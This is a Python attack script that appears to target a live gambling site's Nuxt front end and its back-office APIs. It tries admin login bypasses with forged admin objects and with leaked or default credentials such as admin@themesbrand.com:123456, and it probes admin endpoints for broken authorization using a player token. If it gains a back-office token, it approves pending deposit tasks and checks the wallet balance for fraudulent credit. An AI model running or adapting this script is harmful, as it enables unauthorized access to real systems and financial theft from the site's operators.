#!/usr/bin/env python3
"""probe_nuxt_api.py — Nuxt 3 /api/ server routes + BO session bypass.

   KEY: Nuxt 3 server API routes live at /api/ NOT /bo/*.
   The hint says /account/login with admin object body.
   Also: ThemesBrand demo creds admin@themesbrand.com:123456 found in JS bundle.

   Vectors:
   1. POST /api/account/login with admin object (id, username, firstname, lastname)
   2. POST /api/account/login with ThemesBrand creds
   3. POST /api/* variants
   4. GET /_nuxt/api/* variants
   5. Re-auth player JWT fresh + wallet check
"""
import base64, json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
NUXT   = "https://manage.vak88z2.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

ADMIN_ID   = "5958356c-eb4e-4e07-a155-83e4382e3532"
ADMIN2_ID  = "8155e2a2-77f1-47a1-8242-581be5e00550"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def fresh_auth():
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    return None

print("Re-authenticating...")
JWT = fresh_auth()
if not JWT:
    print("Auth failed! Trying cached JWT...")
    JWT = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        return r.json().get("data", [{}])[0].get("balance", "?")
    return f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. Nuxt /api/* routes (Nuxt 3 server API) ────────────────────────────────
print("=== 1. Nuxt /api/* server routes ===")
nuxt_hdr = {
    "Content-Type": "application/json",
    "Origin": NUXT,
    "Referer": f"{NUXT}/account/login",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Cookie": f"AWSALB={AWSALB}",
}

bo_jwt = None

# Admin object bodies (the hint says body = admin object {id, username, firstname, lastname})
admin_objects = [
    {"id": ADMIN_ID, "username": "admin", "firstname": "admin", "lastname": "admin"},
    {"id": ADMIN_ID, "username": "admin"},
    {"id": ADMIN2_ID, "username": "vak88admin", "firstname": "vak88", "lastname": "admin"},
    # ThemesBrand demo
    {"username": "admin@themesbrand.com", "password": "123456"},
    # Simple creds
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "Aa112233"},
]

nuxt_paths = [
    "/api/account/login",
    "/api/auth/login",
    "/api/bo/authentication",
    "/api/login",
    "/api/admin/login",
    "/api/admin/auth",
    "/_nuxt/api/account/login",
    "/__nuxt_devtools__/",
]

for path in nuxt_paths:
    for body in admin_objects[:3]:
        r = requests.post(f"{NUXT}{path}",
                          headers=nuxt_hdr, json=body, timeout=10)
        ct = r.headers.get("content-type", "")
        is_html = "html" in ct.lower() or r.text.strip().startswith("<!")
        if not is_html and r.status_code not in (404,):
            print(f"  [!!!] POST {path} ({list(body.keys())[0]}): "
                  f"HTTP {r.status_code}: {r.text[:200]}")
            if r.ok and ("token" in r.text.lower() or "access" in r.text.lower()):
                try:
                    bo_jwt = r.json().get("accessToken") or r.json().get("token")
                    print(f"  [!!!] BO JWT: {bo_jwt[:50]}...")
                except Exception:
                    pass
        elif not is_html:
            print(f"  POST {path}: {r.status_code}")
        time.sleep(0.2)

# Also try GET
for path in ["/api/account/login", "/api/auth/session", "/api/me", "/api/admin"]:
    r = requests.get(f"{NUXT}{path}", headers=nuxt_hdr, timeout=10)
    ct = r.headers.get("content-type", "")
    is_html = "html" in ct.lower() or r.text.strip().startswith("<!")
    if not is_html:
        print(f"  GET {path}: HTTP {r.status_code}: {r.text[:150]}")

# ── 2. ThemesBrand demo creds directly on bgapi ──────────────────────────────
print("\n=== 2. ThemesBrand demo creds on bgapi ===")
for creds in [
    {"username": "admin@themesbrand.com", "password": "123456", "domain": DOMAIN},
    {"username": "admin@themesbrand.com", "password": "123456"},
    {"email": "admin@themesbrand.com", "password": "123456", "domain": DOMAIN},
    {"strategy": "local", "username": "admin@themesbrand.com", "password": "123456"},
]:
    r = requests.post(f"{BGAPI}/bo/authentication",
                      headers={"Content-Type": "application/json",
                               "template": "vn", "languagecode": "en",
                               "correlationid": str(uuid.uuid4())},
                      json=creds, timeout=10)
    if r.status_code not in (404,) and "Internal" not in r.text:
        print(f"  ThemesBrand {list(creds.values())[0]}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  ThemesBrand: {r.status_code}")
    time.sleep(0.3)

# ── 3. Check if BOLA /bo/admin-v2 returns admin data with player JWT ──────────
print("\n=== 3. BOLA: /bo/admin-v2 + more admin endpoints ===")
for path in ["/bo/admin-v2", "/bo/info/admin-v2", "/bo/admin/profile",
             "/bo/info/self", "/bo/info/permission", "/bo/info/role"]:
    r = requests.get(f"{BGAPI}{path}",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                     params={"domain": DOMAIN},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:300]}")

# ── 4. If BO JWT obtained, use it ────────────────────────────────────────────
if bo_jwt and len(bo_jwt) > 20:
    print(f"\n=== 4. Using BO JWT to approve deposits ===")
    bo_hdrs = {"Authorization": f"Bearer {bo_jwt}", "template": "vn",
               "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}
    # Get pending slip tasks
    r = requests.get(f"{BGAPI}/bo/slip-deposit-assign-task",
                     headers=bo_hdrs,
                     params={"domain": DOMAIN, "skip": 0, "limit": 20},
                     timeout=12)
    print(f"  slip tasks: HTTP {r.status_code}: {r.text[:400]}")
    if r.ok:
        try:
            items = r.json().get("data", []) if isinstance(r.json(), dict) else r.json()
            for task in items[:5]:
                task_id = task.get("id")
                print(f"  task {str(task_id)[:8]} | "
                      f"status={task.get('status')} | "
                      f"amount={task.get('deposit_amount', task.get('amount','?'))}")
                if task_id:
                    ar = requests.post(f"{BGAPI}/bo/slip-deposit-assign-task/admin-do-task",
                                       headers={**bo_hdrs, "languagecode": "en",
                                                "correlationid": str(uuid.uuid4())},
                                       json={"id": task_id, "status": "approved",
                                             "domain": DOMAIN},
                                       timeout=10)
                    print(f"    approve: HTTP {ar.status_code}: {ar.text[:100]}")
        except Exception as e:
            print(f"  parse err: {e}")

# ── 5. Try mgapi POST with no JWT (check if mgapi is broken for all POST) ─────
print("\n=== 5. mgapi POST status check ===")
for path, payload in [
    ("/mb/auto-slip-deposit", {"deposit_amount": 1}),
    ("/mb/sign-url-upload-slip", {"filename": "test.jpg", "content_type": "image/jpeg", "size": 100}),
    ("/mb/wallet/transfer", {"amount": 1}),
]:
    r = requests.post(f"{MGAPI}{path}", headers=HDR, json=payload, timeout=10)
    print(f"  POST {path}: HTTP {r.status_code}: {r.text[:100]}")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
